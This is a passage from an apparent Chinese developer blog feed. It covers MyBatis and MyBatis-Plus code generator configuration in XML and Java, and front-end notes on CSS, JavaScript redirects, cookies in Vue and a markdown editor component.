class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--MySQL 8.x 需要指定服务器的时区--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;serverTimezone&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Asia/Shanghai&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--MySQL 不支持 schema 或者 catalog 所以需要添加这个--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参考 : http://www.mybatis.org/generator/usage/mysql.html--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nullCatalogMeansCurrent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- MySQL8默认启用 SSL ,不关闭会有警告--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useSSL&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--为 true时把JDBC DECIMAL 和 NUMERIC 类型解析为java.math.BigDecimal--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;forceBigDecimals&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--实体类生成信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;top.nanzx.entity&quot;</span> <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 从数据库返回的值被清理前后的空格 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- targetProject:mapper映射文件生成的位置 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;sqlMapGenerator targetPackage=&quot;top.nanzx.mapper&quot; targetProject=&quot;src\main\resources&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &amp;lt;!&amp;ndash; enableSubPackages:是否让schema作为包的后缀 &amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/sqlMapGenerator&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- targetPackage：mapper接口生成的位置 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;javaClientGenerator type=&quot;XMLMAPPER&quot; targetPackage=&quot;top.nanzx.dao&quot; targetProject=&quot;src\main\java&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &amp;lt;!&amp;ndash; enableSubPackages:是否让schema作为包的后缀 &amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/javaClientGenerator&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--要生成的表结构，根据数据库的表追加--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后在IDEA的右边栏中选中Maven，执行相应插件：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210127234326.png"></p><hr><h1 id="MyBatis-Plus的代码生成器"><a href="#MyBatis-Plus的代码生成器" class="headerlink" title="MyBatis-Plus的代码生成器"></a>MyBatis-Plus的代码生成器</h1><p>注意版本差异，具体查看<a href="https://mp.baomidou.com/config/generator-config.html#%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE">官方文档</a>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.freemarker<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.blog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.toolkit.StringPool;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.toolkit.StringUtils;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.InjectionConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.*;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.TableInfo;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CodeGenerator</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 读取控制台内容</span></span><br><span class="line"><span class="comment">     * &lt;/p&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">scanner</span><span class="params">(String tip)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">help</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        help.append(<span class="string">&quot;请输入&quot;</span> + tip + <span class="string">&quot;：&quot;</span>);</span><br><span class="line">        System.out.println(help.toString());</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ipt</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotEmpty(ipt)) &#123;</span><br><span class="line">                <span class="keyword">return</span> ipt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusException</span>(<span class="string">&quot;请输入正确的&quot;</span> + tip + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 代码生成器</span></span><br><span class="line">        <span class="type">AutoGenerator</span> <span class="variable">mpg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoGenerator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 全局配置</span></span><br><span class="line">        <span class="type">GlobalConfig</span> <span class="variable">gc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GlobalConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">projectPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        gc.setOutputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">        gc.setAuthor(<span class="string">&quot;nan&quot;</span>);</span><br><span class="line">        gc.setOpen(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// gc.setSwagger2(true); 实体属性 Swagger2 注解</span></span><br><span class="line">        gc.setServiceName(<span class="string">&quot;%sService&quot;</span>);</span><br><span class="line">        mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据源配置</span></span><br><span class="line">        <span class="type">DataSourceConfig</span> <span class="variable">dsc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceConfig</span>();</span><br><span class="line">        dsc.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/blog?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=UTC&quot;</span>);</span><br><span class="line">        dsc.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        dsc.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dsc.setPassword(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        mpg.setDataSource(dsc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 包配置</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>();</span><br><span class="line">        pc.setModuleName(<span class="literal">null</span>);</span><br><span class="line">        pc.setParent(<span class="string">&quot;top.nanzx.blog&quot;</span>);</span><br><span class="line">        mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自定义配置</span></span><br><span class="line">        <span class="type">InjectionConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectionConfig</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initMap</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// to do nothing</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果模板引擎是 freemarker</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">templatePath</span> <span class="operator">=</span> <span class="string">&quot;/templates/mapper.xml.ftl&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果模板引擎是 velocity</span></span><br><span class="line">        <span class="comment">// String templatePath = &quot;/templates/mapper.xml.vm&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自定义输出配置</span></span><br><span class="line">        List&lt;FileOutConfig&gt; focList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 自定义配置会被优先输出</span></span><br><span class="line">        focList.add(<span class="keyword">new</span> <span class="title class_">FileOutConfig</span>(templatePath) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">outputFile</span><span class="params">(TableInfo tableInfo)</span> &#123;</span><br><span class="line">                <span class="comment">// 自定义输出文件名 ， 如果你 Entity 设置了前后缀、此处注意 xml 的名称会跟着发生变化！！</span></span><br><span class="line">                <span class="keyword">return</span> projectPath + <span class="string">&quot;/src/main/resources/mapper/&quot;</span></span><br><span class="line">                        + <span class="string">&quot;/&quot;</span> + tableInfo.getEntityName() + <span class="string">&quot;Mapper&quot;</span> + StringPool.DOT_XML;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        cfg.setFileOutConfigList(focList);</span><br><span class="line">        mpg.setCfg(cfg);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置模板</span></span><br><span class="line">        <span class="type">TemplateConfig</span> <span class="variable">templateConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplateConfig</span>();</span><br><span class="line"></span><br><span class="line">        templateConfig.setXml(<span class="literal">null</span>);</span><br><span class="line">        mpg.setTemplate(templateConfig);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 策略配置</span></span><br><span class="line">        <span class="type">StrategyConfig</span> <span class="variable">strategy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrategyConfig</span>();</span><br><span class="line">        strategy.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategy.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategy.setEntityLombokModel(<span class="literal">true</span>);</span><br><span class="line">        strategy.setRestControllerStyle(<span class="literal">true</span>);</span><br><span class="line">        strategy.setInclude(scanner(<span class="string">&quot;表名，多个英文逗号分割&quot;</span>).split(<span class="string">&quot;,&quot;</span>));</span><br><span class="line">        strategy.setControllerMappingHyphenStyle(<span class="literal">true</span>);</span><br><span class="line">        mpg.setStrategy(strategy);</span><br><span class="line">        mpg.setTemplateEngine(<span class="keyword">new</span> <span class="title class_">FreemarkerTemplateEngine</span>());</span><br><span class="line">        mpg.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
            <tag> Mybatis-Plus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端的一些笔记</title>
      <link href="/posts/261b/"/>
      <url>/posts/261b/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS相关"><a href="#CSS相关" class="headerlink" title="CSS相关"></a>CSS相关</h1><h2 id="div填充整个页面"><a href="#div填充整个页面" class="headerlink" title="div填充整个页面"></a>div填充整个页面</h2><ul><li>解决小白边</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>, <span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="div位置移动"><a href="#div位置移动" class="headerlink" title="div位置移动"></a>div位置移动</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box-card1</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">520px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">430px</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">140px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="元素移动"><a href="#元素移动" class="headerlink" title="元素移动"></a>元素移动</h2><p><code> style=&quot;float: left&quot;</code></p><h2 id="背景图填充整个div"><a href="#背景图填充整个div" class="headerlink" title="背景图填充整个div"></a>背景图填充整个div</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.login</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;https://unpkg.com/nan-picture/img/3标签.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="div添加下划线（阴影）"><a href="#div添加下划线（阴影）" class="headerlink" title="div添加下划线（阴影）"></a>div添加下划线（阴影）</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.row-bg</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: medium solid <span class="number">#E0E0E0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/cssref/pr_border-bottom.asp">更多介绍</a></p><h2 id="控制字体行间距"><a href="#控制字体行间距" class="headerlink" title="控制字体行间距"></a>控制字体行间距</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.i-info</span>&#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="a标签字体去掉下划线"><a href="#a标签字体去掉下划线" class="headerlink" title="a标签字体去掉下划线"></a>a标签字体去掉下划线</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Js实现页面跳转"><a href="#Js实现页面跳转" class="headerlink" title="Js实现页面跳转"></a>Js实现页面跳转</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">shref</span>=<span class="string">&#x27;http://localhost:8181/download/2/web安全.md&#x27;</span> <span class="attr">download</span>=<span class="string">&quot;web安全.md&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如a标签的跳转，可下载文件等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://www.baidu.com&#x27;</span>  <span class="comment">//当前页面打开</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)  <span class="comment">//新窗口打开</span></span><br></pre></td></tr></table></figure><h1 id="Vue相关"><a href="#Vue相关" class="headerlink" title="Vue相关"></a>Vue相关</h1><h2 id="Element的下拉菜单点击事件无反应"><a href="#Element的下拉菜单点击事件无反应" class="headerlink" title="Element的下拉菜单点击事件无反应"></a>Element的下拉菜单点击事件无反应</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-dropdown-item <span class="keyword">@click</span>.native=&quot;out&quot;&gt;退出&lt;/el-dropdown-item&gt;</span><br></pre></td></tr></table></figure><p><strong>在@click后加.native</strong></p><hr><h2 id="Vue中使用Cookie"><a href="#Vue中使用Cookie" class="headerlink" title="Vue中使用Cookie"></a>Vue中使用Cookie</h2><p>安装：<code>npm install js-cookie --save</code></p><p>在main.js中全局注册：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> jsCookie <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$cookie</span> = jsCookie;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$cookie</span>.<span class="title function_">set</span>(<span class="string">&quot;token&quot;</span>,res.<span class="property">data</span>.<span class="property">data</span>)<span class="comment">//关闭浏览器自动失效</span></span><br></pre></td></tr></table></figure><p><strong>注意：axios默认不携带cookie，需设置axios.defaults.withCredentials &#x3D; true</strong></p><hr><h2 id="在Vue中如何使用markdown编辑器"><a href="#在Vue中如何使用markdown编辑器" class="headerlink" title="在Vue中如何使用markdown编辑器"></a>在Vue中如何使用markdown编辑器</h2><p>安装：<code>npm install mavon-editor --save</code></p><p>在main.js中全局注册：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局注册</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> mavonEditor <span class="keyword">from</span> <span class="string">&#x27;mavon-editor&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;mavon-editor/dist/css/index.css&#x27;</span></span><br><span class="line"><span class="comment">// use</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(mavonEditor)</span><br></pre></td></tr></table></figure><p>在页面使用组件即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mavon-editor</span> <span class="attr">v-model</span>=<span class="string">&quot;ruleForm.content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mavon-editor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201122171228.png"></p><p>对于后台请求过来的markdown格式文章如何解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 